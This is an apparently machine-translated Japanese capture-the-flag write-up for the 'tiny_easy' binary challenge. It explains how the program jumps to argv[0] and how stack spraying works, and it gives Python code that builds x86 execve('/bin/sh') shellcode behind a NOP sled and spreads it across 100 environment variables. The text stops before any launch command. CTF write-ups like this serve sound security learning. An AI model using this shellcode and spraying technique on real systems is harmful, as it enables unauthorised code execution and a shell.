tiny_easyジョブの解決策


tyni_easy署名アイコンをクリックします。 ssh経由で接続するためのアドレスとポートが提供されます。



SSHを介して接続されており、フラグとプログラムにはすでにソースコードがありません。



ファイルを確認した結果、保護されていないことがわかりました。



プログラムを逆アセンブラにダウンロードします。ファイルは非常に小さく、いくつかの指示に従ってください。



最初に、プログラムはスタックから値をEAXレジスタに抽出し、その後、別の値をEDXに抽出して、制御をこのアドレスに転送します。しかし、プログラムの最初のスタックには何がありますか？この時点のスタックには、argc（プログラム引数の数）、argv（プログラム引数の配列へのポインター）、およびenvp（環境変数の配列へのポインター）がまったく同じです。



したがって、EDXでは、アドレスはプログラム引数の配列の最初の要素、つまり実行可能ファイルへの絶対パスに配置されます。したがって、コードとして実行しようとすると、アプリケーションがクラッシュするはずです。チェックすれば判明します。



スタックスプレーは、アプリケーションのメモリ内のエラーを使用する攻撃であり、これにより、アプリケーションは悪意のあるコードを含む多数のオブジェクトにメモリを割り当てます。これにより、エクスプロイトが成功する可能性が高まり、実行フローが内部の特定の位置に移動します。実行のフローを変更できるエクスプロイトがなければ、この攻撃は害を及ぼさないことを理解することが重要です。攻撃は、プロセスアドレス空間内のアドレスの予測可能性に基づいています。

オペレーティングシステムでプロセスを作成すると、ユーザーデータ、実行可能コード、および特定のオペレーティングシステムに依存するいくつかのシステム情報が配置されているアドレススペースがそのニーズに割り当てられます。したがって、スタックセグメントには、自動配置クラスの変数と、関数が呼び出されるたびに保存される情報（たとえば、関数が呼び出されたときの静的変数と戻りアドレス）が保存されます。スタックスプレーの場合、エクスプロイトが配置されている環境変数を操作します。

このようにして、スタックの環境変数にシェルコードを配置できます。しかし、正確なアドレスに正確に到達することができないため、彼の前で多くのnop操作を実行します。

import os

payload =  "\x90"*4096 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"


プログラムはアドレス0xff ******から開始するため、この環境からスタックのランダムアドレス（たとえば、0xffbbbbbbb）を取得します。
addr = "\xb0\xaf\xb5\xff"


次に、シェルコードを使用していくつかの環境変数を作成します。これにより、環境変数に到達する確率が高くなります。

envs = {}
for i in range(0,100):  
    envs["env"+str(i)] = payload

そして数回、パラメーターを使用してプログラムを実行します。
